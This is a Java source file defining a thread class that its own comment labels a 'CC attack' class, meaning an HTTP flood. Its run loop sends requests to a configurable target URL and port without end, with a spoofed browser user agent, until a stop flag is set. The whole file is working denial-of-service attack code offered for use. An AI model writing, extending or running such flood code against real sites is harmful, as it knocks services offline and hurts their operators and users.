package com.zhanyingwl.www;

import java.io.IOException;
import java.net.*;

import static com.zhanyingwl.www.doDCRun.*;

/**
 * @ClassName : ccThread
 * @Description : CC攻击类
 * @Author : 战鹰
 * @Version:
 */

public class ccThread extends Thread {
    static String UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36";

    @Override
    public void run() {
        while (true) {
            HttpURLConnection httpURLConnection = null;
            try {
                if (!stop) {
                    URL url = new URL(URLheader + targetURL + ":" + targetPort);
                    httpURLConnection = (HttpURLConnection) url.openConnection();
                    httpURLConnection.setRequestProperty("User-Agent", UserAgent); // 设置UA
                    httpURLConnection.getResponseCode();
                } else if (stop) {
                    break;
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            httpURLConnection.disconnect();
            threadLock = 0; // 解除单线程锁
        }
    }
}
